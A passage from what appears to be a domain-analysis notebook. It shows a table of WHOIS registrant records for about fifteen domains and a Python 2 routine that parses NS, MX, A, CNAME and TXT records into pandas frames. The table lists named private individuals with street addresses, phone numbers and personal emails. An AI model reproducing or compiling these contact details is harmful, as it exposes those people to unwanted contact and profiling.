      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.7603254755</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   CA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                        1001 S PALM CANYON DR STE 217</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                           92264-8349</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                            DNS Admin</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                dns@ADVANCEDMINDS.COM</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                      San Luis Obispo</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.7345724470</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                        Phelan, Kelly</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.7349456066</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   CA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                    777 Mill St Apt 6</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                93401</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                                 null</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                   centaurus7@AOL.COM</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                              NS2.WEST-DATACENTER.NET</td>
    </tr>
    <tr>
      <th></th>
      <td>                                              NS1.WEST-DATACENTER.NET</td>
    </tr>
    <tr>
      <th rowspan="21" valign="top">tdbrecords.com</th>
      <th rowspan="18" valign="top">contacts</th>
      <th rowspan="9" valign="top">tech</th>
      <th>city</th>
      <td>                                                               Boston</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                     Jonah Livingston</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                        United States</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                           6172308529</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                        Massachusetts</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                   902 Huntington ave</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                02115</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                          TDB Records</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                             bloodbathrecords@aol.com</td>
    </tr>
    <tr>
      <th rowspan="9" valign="top">admin</th>
      <th>city</th>
      <td>                                                               Boston</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                     Jonah Livingston</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                        United States</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                           6172308529</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                        Massachusetts</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                   902 Huntington ave</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                02115</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                          TDB Records</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                             bloodbathrecords@aol.com</td>
    </tr>
    <tr>
      <th rowspan="3" valign="top">nameservers</th>
      <th rowspan="3" valign="top"></th>
      <th></th>
      <td>                                                    NS1.DREAMHOST.COM</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                    NS2.DREAMHOST.COM</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                    NS3.DREAMHOST.COM</td>
    </tr>
    <tr>
      <th rowspan="20" valign="top">electrichumanproject.com</th>
      <th rowspan="18" valign="top">contacts</th>
      <th rowspan="9" valign="top">tech</th>
      <th>city</th>
      <td>                                                              Tsukuba</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                        840Domains Tsukuba 840Domains</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                Japan</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                       +81.5055349763</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                              Ibaraki</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                        Baien 2-1-15\nSupuringutekku Tsukuba bld. 401</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                             305-0045</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                              Tsukuba</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                          domain_resister@yahoo.co.jp</td>
    </tr>
    <tr>
      <th rowspan="9" valign="top">admin</th>
      <th>city</th>
      <td>                                                              Tsukuba</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                        840Domains Tsukuba 840Domains</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                Japan</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                       +81.5055349763</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                              Ibaraki</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                        Baien 2-1-15\nSupuringutekku Tsukuba bld. 401</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                             305-0045</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                              Tsukuba</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                          domain_resister@yahoo.co.jp</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                             SNS41.WEBSITEWELCOME.COM</td>
    </tr>
    <tr>
      <th></th>
      <td>                                             SNS42.WEBSITEWELCOME.COM</td>
    </tr>
    <tr>
      <th rowspan="21" valign="top">besound.com</th>
      <th rowspan="19" valign="top">contacts</th>
      <th rowspan="9" valign="top">tech</th>
      <th>city</th>
      <td>                                                            San Diego</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                         858-450-0567</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                        United States</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                         858-458-0490</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                           California</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                   5266 Eastgate Mall</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                92121</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                                A+Net</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                         dns@abac.com</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                          LINDENHURST</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                         999 999 9999</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                        Richard Lopez</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                        United States</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                       (516) 226-8430</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                             New York</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                          180 34TH ST</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                           11757-3243</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                   BeSound Multimedia</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                besound@optonline.net</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                              BDNS.CV.SITEPROTECT.COM</td>
    </tr>
    <tr>
      <th></th>
      <td>                                              ADNS.CV.SITEPROTECT.COM</td>
    </tr>
    <tr>
      <th rowspan="18" valign="top">porkchopscreenprinting.com</th>
      <th rowspan="16" valign="top">contacts</th>
      <th rowspan="8" valign="top">tech</th>
      <th>city</th>
      <td>                                                             New York</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                     Domain Registrar</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.9027492701</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   NY</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                            575 8th Avenue 11th Floor</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                10018</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                         Register.Com</td>
    </tr>
    <tr>
      <th rowspan="8" valign="top">admin</th>
      <th>city</th>
      <td>                                                              Seattle</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                        Damon Baldwin</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.2067064764</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   WA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                      9218 9th ave NW</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                98117</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                            Pork Chop Screen Printing</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                            ns1.hosting-advantage.com</td>
    </tr>
    <tr>
      <th></th>
      <td>                                            ns2.hosting-advantage.com</td>
    </tr>
    <tr>
      <th rowspan="22" valign="top">kinseyvisual.com</th>
      <th rowspan="20" valign="top">contacts</th>
      <th rowspan="10" valign="top">tech</th>
      <th>city</th>
      <td>                                                          Culver City</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.8186498230</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                ADMINISTRATOR, DOMAIN</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.8775784000</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   CA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                               8520 National Blvd. #A</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                90232</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                         Media Temple</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                             dnsadmin@MEDIATEMPLE.NET</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                            SAN DIEGO</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.6195449594</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                         Kinsey, Dave</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.6195449595</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   CA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                         705 12TH AVE</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                           92101-6507</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                         BlkMkrt Inc.</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                     dave@BLKMRKT.COM</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                                  NS1.MEDIATEMPLE.NET</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                  NS2.MEDIATEMPLE.NET</td>
    </tr>
    <tr>
      <th rowspan="23" valign="top">rathergood.com</th>
      <th rowspan="20" valign="top">contacts</th>
      <th rowspan="10" valign="top">tech</th>
      <th>city</th>
      <td>                                                               London</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.9999999999</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                         Veitch, Joel</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   UK</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                       +1.08072547734</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                 null</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                    10 Croston Street</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                 null</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                                 null</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                  joel@rathergood.com</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                               London</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.9999999999</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                         Veitch, Joel</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   UK</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                       +1.08072547734</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                 null</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                    10 Croston Street</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                 null</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                                 null</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                  joel@rathergood.com</td>
    </tr>
    <tr>
      <th rowspan="3" valign="top">nameservers</th>
      <th rowspan="3" valign="top"></th>
      <th></th>
      <td>                                                    NS1.DREAMHOST.COM</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                    NS3.DREAMHOST.COM</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                    NS2.DREAMHOST.COM</td>
    </tr>
    <tr>
      <th rowspan="22" valign="top">lepoint.fr</th>
      <th rowspan="19" valign="top">contacts</th>
      <th rowspan="9" valign="top">tech</th>
      <th>city</th>
      <td>                                                                Paris</td>
    </tr>
    <tr>
      <th>handle</th>
      <td>                                                          GR283-FRNIC</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                           GANDI ROLE</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   FR</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                        Gandi\n15, place de la Nation</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                75011</td>
    </tr>
    <tr>
      <th>type</th>
      <td>                                                                 ROLE</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                        noc@gandi.net</td>
    </tr>
    <tr>
      <th>changedate</th>
      <td>                                                  2006-03-03T00:00:00</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                                Paris</td>
    </tr>
    <tr>
      <th>handle</th>
      <td>                                                        SDED175-FRNIC</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                    SOCIETE D'EXPLOITATION DE L'HEBDOMADAIRE LE POINT</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   FR</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                    +33 1 44 10 10 10</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                  74, avenue du maine</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                75014</td>
    </tr>
    <tr>
      <th>type</th>
      <td>                                                         ORGANIZATION</td>
    </tr>
    <tr>
      <th>email</th>
      <td>            b396c2138803c796a2cc37d347a1797c-857941@contact.gandi.net</td>
    </tr>
    <tr>
      <th>changedate</th>
      <td>                                                  2013-07-10T00:00:00</td>
    </tr>
    <tr>
      <th rowspan="3" valign="top">nameservers</th>
      <th rowspan="3" valign="top"></th>
      <th></th>
      <td>                                                      b.dns.gandi.net</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                      a.dns.gandi.net</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                      c.dns.gandi.net</td>
    </tr>
    <tr>
      <th rowspan="24" valign="top">revhq.com</th>
      <th rowspan="20" valign="top">contacts</th>
      <th rowspan="10" valign="top">tech</th>
      <th>city</th>
      <td>                                                     HUNTINGTON BEACH</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.5555555555</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                        JORDAN COOPER</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.7148427584</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   CA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                        P.O. BOX 5232</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                92615</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                     REV DISTRIBUTION</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                    JCOOPER@REVHQ.COM</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                     HUNTINGTON BEACH</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.5555555555</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                        JORDAN COOPER</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.7148427584</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   CA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                        P.O. BOX 5232</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                92615</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                     REV DISTRIBUTION</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                    JCOOPER@REVHQ.COM</td>
    </tr>
    <tr>
      <th rowspan="4" valign="top">nameservers</th>
      <th rowspan="4" valign="top"></th>
      <th></th>
      <td>                                                      NS1.CLOUDNS.NET</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                      NS2.CLOUDNS.NET</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                      NS3.CLOUDNS.NET</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                      NS4.CLOUDNS.NET</td>
    </tr>
    <tr>
      <th rowspan="18" valign="top">poprocksandcoke.com</th>
      <th rowspan="16" valign="top">contacts</th>
      <th rowspan="8" valign="top">tech</th>
      <th>city</th>
      <td>                                                            Ljubljana</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                         Matija Zajec</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                             Slovenia</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +386.30363699</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                    Osrednjeslovenska</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                  Krizevniska ulica 7</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                 1000</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                     kukmak@gmail.com</td>
    </tr>
    <tr>
      <th rowspan="8" valign="top">admin</th>
      <th>city</th>
      <td>                                                            Ljubljana</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                         Matija Zajec</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                             Slovenia</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +386.30363699</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                    Osrednjeslovenska</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                  Krizevniska ulica 7</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                 1000</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                     kukmak@gmail.com</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                                        NS3.WEBDNS.PW</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                        NS4.WEBDNS.PW</td>
    </tr>
    <tr>
      <th rowspan="22" valign="top">samuraiblue.com</th>
      <th rowspan="20" valign="top">contacts</th>
      <th rowspan="10" valign="top">tech</th>
      <th>city</th>
      <td>                                                           Louisville</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.5025692774</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                      MaximumASP, LLC</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.5025692771</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   KY</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                    540 Baxter Avenue</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                40204</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                      MaximumASP, LLC</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                   noc@maximumasp.com</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                                Tampa</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.9999999999</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                         Meronek, Rob</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                         +1.838575819</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   FL</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                         777 North Ashley Drive #1212</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                33602</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                           The Boardr</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                      rob@meronek.com</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                                    DNS1.MIDPHASE.COM</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                    DNS2.MIDPHASE.COM</td>
    </tr>
    <tr>
      <th rowspan="27" valign="top">openbsd.org</th>
      <th rowspan="20" valign="top">contacts</th>
      <th rowspan="10" valign="top">tech</th>
      <th>city</th>
      <td>                                                      Calgary Alberta</td>
    </tr>
    <tr>
      <th>handle</th>
      <td>                                                           CR32086106</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                       Theos Software</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   CA</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                          +1.40323798</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                              Alberta</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                      812 23rd ave SE</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                              T2G 1N8</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                       Theos Software</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                    deraadt@theos.com</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                              Calgary</td>
    </tr>
    <tr>
      <th>handle</th>
      <td>                                                           CR32086107</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                        Theo de Raadt</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   CA</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.4032379834</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                              Alberta</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                      812 23rd Ave SE</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                               T2G1N8</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                       Theos Software</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                                    deraadt@theos.com</td>
    </tr>
    <tr>
      <th rowspan="7" valign="top">nameservers</th>
      <th rowspan="7" valign="top"></th>
      <th></th>
      <td>                                                      NS1.TELSTRA.NET</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                     NS.SIGMASOFT.COM</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                   NS1.SUPERBLOCK.NET</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                   NS2.SUPERBLOCK.NET</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                       ZEUS.THEOS.COM</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                         C.NS.BSWS.DE</td>
    </tr>
    <tr>
      <th></th>
      <td>                                                         A.NS.BSWS.DE</td>
    </tr>
    <tr>
      <th rowspan="22" valign="top">sysblog.com</th>
      <th rowspan="20" valign="top">contacts</th>
      <th rowspan="10" valign="top">tech</th>
      <th>city</th>
      <td>                                                              Waltham</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.7818392801</td>
    </tr>
    <tr>
      <th>name</th>
      <td> Toll Free: 866-822-9073 Worldwide: 339-222-5132 This Domain For Sale</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.8668229073</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   MA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                 738 Main Street #389</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                02451</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                       BuyDomains.com</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                             brokerage@buydomains.com</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                              Waltham</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.7818392801</td>
    </tr>
    <tr>
      <th>name</th>
      <td> Toll Free: 866-822-9073 Worldwide: 339-222-5132 This Domain For Sale</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.8668229073</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   MA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                 738 Main Street #389</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                02451</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                       BuyDomains.com</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                             brokerage@buydomains.com</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                                    NS.BUYDOMAINS.COM</td>
    </tr>
    <tr>
      <th></th>
      <td>                                             THIS-DOMAIN-FOR-SALE.COM</td>
    </tr>
    <tr>
      <th rowspan="22" valign="top">voicesofsafety.com</th>
      <th rowspan="20" valign="top">contacts</th>
      <th rowspan="10" valign="top">tech</th>
      <th>city</th>
      <td>                                                           Burlington</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                         +1.782722915</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                    BizLand.com, Inc.</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                         +1.782725585</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   MA</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                               121 Middlesex Turnpike</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                01803</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                    BizLand.com, Inc.</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                               DomReg@BIZLAND-INC.COM</td>
    </tr>
    <tr>
      <th rowspan="10" valign="top">admin</th>
      <th>city</th>
      <td>                                                      NORTHE COLDWELL</td>
    </tr>
    <tr>
      <th>fax</th>
      <td>                                                        +1.9732280276</td>
    </tr>
    <tr>
      <th>name</th>
      <td>                                                  VOICESOFSAFTY INT'L</td>
    </tr>
    <tr>
      <th>country</th>
      <td>                                                                   US</td>
    </tr>
    <tr>
      <th>phone</th>
      <td>                                                        +1.9732282258</td>
    </tr>
    <tr>
      <th>state</th>
      <td>                                                                   NJ</td>
    </tr>
    <tr>
      <th>street</th>
      <td>                                                         264 park ave</td>
    </tr>
    <tr>
      <th>postalcode</th>
      <td>                                                                07006</td>
    </tr>
    <tr>
      <th>organization</th>
      <td>                                                  VOICESOFSAFTY INT'L</td>
    </tr>
    <tr>
      <th>email</th>
      <td>                                         webmaster@voicesofsafety.com</td>
    </tr>
    <tr>
      <th rowspan="2" valign="top">nameservers</th>
      <th rowspan="2" valign="top"></th>
      <th></th>
      <td>                                              CLICKME2.CLICK2SITE.COM</td>
    </tr>
    <tr>
      <th></th>
      <td>                                               CLICKME.CLICK2SITE.COM</td>
    </tr>
  </tbody>
</table>
</div>
<h2 id="read-dns-information">Read DNS information</h2>
<p>Do the same with the DNS files&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
from pprint import pprint
import re
import traceback

# Global DF frames
frames = []

def read_dns(domains):
    for d in domains:
        print(&#34;Reading WHOIS for\t %s&#34; % d)
        data = []
        try:
            with open(&#39;DNS/%s.txt&#39; % d, &#39;r&#39;) as inputfile:
                dns = inputfile.read()
                
                for l in dns.splitlines():
                    records = l.split()
                    
                    # Check only for NS, MX, A, CNAME, TXT
                    a = re.compile(&#34;^(NS|MX|A|CNAME|TXT)$&#34;)
                    if len(records) &gt;= 4:
                        if a.match(records[3]):
                            data.append([d, records[3], records[4]])
                
                # Create DF only if data is not empty
                if data:
                    df = pd.DataFrame(data, columns=[&#39;domain&#39;, &#39;dns_record&#39;, &#39;value&#39;])
                    frames.append(df)      
                    
                # Close file
                inputfile.close()
                
        except Exception, err:
            print(&#34;[ERROR] Couldn&#39;t read WHOIS for\t %s&#34; % d)
            traceback.print_exc()

#read_dns(uniq_subdomains)            
read_dns(uniq_roots[:20])
</code></pre></div><pre><code>Reading WHOIS for	 altpress.org
Reading WHOIS for	 nzfortress.co.nz
Reading WHOIS for	 evillasforsale.com
Reading WHOIS for	 playingenemy.com
Reading WHOIS for	 richardsonscharts.com
Reading WHOIS for	 xenith.net
Reading WHOIS for	 tdbrecords.com
